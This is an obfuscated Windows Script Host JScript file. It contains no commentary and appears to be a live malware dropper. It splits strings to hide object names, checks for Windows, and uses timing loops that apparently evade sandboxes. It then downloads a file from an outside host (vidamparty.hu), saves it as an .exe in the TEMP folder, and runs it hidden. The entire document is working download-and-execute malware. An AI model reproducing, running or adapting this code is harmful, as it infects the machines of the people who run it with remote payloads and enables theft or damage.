var Q = false;
var B = "Create"+"Object";
var XL = function AG() {return WScript[B]("WScript"+".Shell");}(), UY = 11;
var X = "MSXML2"+".XMLHTTP";
var EY = 2;
var JP = EY - 2;
function DL(L0){XL["Run"](L0, JP, JP);};
function R(){return X + "";};
function V(U, I0){JP = JP * 1; return U - I0;};
function SF(){return B;};
/*@cc_on
  @if (@_win32 || @_win64)
    Q = true;
  @end
@*/
if (Q)
{
var XN = "";
function F(){return 22;};
var L1 = 0; var N = 0;
function L()
{
var OJ = new this["Date"]();
var RR = OJ["getUTCMilliseconds"]();
WScript["Sleep"](F());
var OJ = new this["Date"]();
var P = OJ["getUTCMilliseconds"]();
WScript["Sleep"](F());
var OJ = new this["Date"]();
var A = OJ["getUTCMilliseconds"]();
var L1 = "LW";
L1 = V(P, RR);
var N = "G";
N = V(A, P);
XN = "open";
return V(L1, N);
}
var OD = false;
var IB = false;
for (var PT = JP; PT < F() * 1; PT++){if (L() != JP){
OD = true; 
N = "31" + 11 * L1 + N; 
IB = true; 
break;
}}
function KB() {return ((OD == true) && (OD == IB)) ? 1 : JP;};
if (OD && KB() && IB){
function E() {return XL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "cxSrrU2cHOL.ex" + "e";};
 MG = R();
 P0 = WScript[B](MG);
 var UQ = 1;
do { 
	for (;UQ;){
	try {
		if (UQ == 1)
		{
			P0[XN]("GET", "http://vidamparty.hu/as0ldr", false);
			P0["send"]();
			FX = "Sleep";
			UQ = 2;
		}
		WScript[FX](F() + 120); 
		if (P0["readystate"] < 2 * 2) continue;
		UQ = JP;
		function OT(XE) {var GU = (1, 2, 3, 4, 5, XE); return GU;};
		DA = WScript[SF()]("ADODB.Stream");
		MG = DA;
		MG[XN]();
		MG["type"] = OT(1);
		MG["write"](P0["ResponseBody"]);
		DA["position"] = OT(JP);
		MG["Save" + "ToFile"](E(), 2);
		DA["cl"+"ose"]();
		I = E();
		DL(I);
	} catch(X0){};};
}while (UQ);
}
}

